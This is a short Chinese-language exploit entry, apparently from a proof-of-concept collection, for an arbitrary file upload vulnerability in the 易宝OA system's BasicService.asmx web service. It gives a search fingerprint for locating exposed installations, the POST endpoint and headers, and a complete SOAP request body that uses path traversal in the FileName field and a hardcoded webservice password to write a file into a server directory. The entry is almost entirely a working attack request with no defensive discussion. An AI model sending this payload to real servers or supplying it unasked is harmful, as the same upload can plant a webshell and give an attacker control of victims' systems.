# 易宝OA-BasicService.asmx任意文件上传漏洞

- **系统**：易宝OA-BasicService.asmx　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="欢迎登录易宝OA系统"`
- **请求**：`POST /WebService/BasicService.asmx HTTP/1.1`
- **关键头**：`SOAPAction: [http://tempuri.org/UploadBillFile](http://tempuri.org/UploadBillFile)`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:UploadBillFile>
<!--type: base64Binary-->
<tem:fs>aGVsbG8K</tem:fs>
<!--type: string-->
<tem:FileName>../../manager/dudesite.aspx</tem:FileName>
<!--type: string-->
<tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>
</tem:UploadBillFile>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　—